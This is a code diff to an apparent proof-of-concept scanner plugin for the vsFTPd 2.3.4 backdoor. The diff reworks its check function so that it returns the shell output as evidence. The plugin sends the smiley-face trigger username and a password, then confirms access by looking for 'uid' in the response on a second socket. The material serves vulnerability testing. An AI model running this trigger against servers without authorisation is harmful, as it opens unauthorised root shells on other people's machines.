@@ -17,7 +17,7 @@ def check_smile(ip,port):
         s.connect((ip,int(port)))
         banner = s.recv(1024)
         if b'vsFTPd 2.3.4' not in banner:
-            return False
+            return False,''
         s.send(b'USER root:)\n')
         logger.info(s.recv(1024))
         s.send(b'PASS 123123\n')
@@ -30,13 +30,13 @@ def check_smile(ip,port):
         recv = check_s.recv(1024)
         logger.info(recv)
         if b'uid' in recv:
-            return True
+            return True,recv
     except Exception as e:
         logger.info('{}:{}\t{}'.format(ip,port,str(e)))
     finally:
         s.close()
         check_s.close()
-    return False
+    return False,''
 
 class FTP_BACKDOOR_POC(POCBase):
     vulID = ''
@@ -61,10 +61,11 @@ class FTP_BACKDOOR_POC(POCBase):
         host = self.getg_option("rhost")
         port = self.getg_option("rport") or 21
         result = {}
-        if check_smile(host,port):
+        res,evi =  check_smile(host,port)
+        if res:
             result['VerifyInfo'] = {}
             result['VerifyInfo']['URL'] = self.url
-            result['extra'] = ''
+            result['extra'] = evi.decode()
         return self.parse_output(result)
     def _attack(self):
         return self._verify()
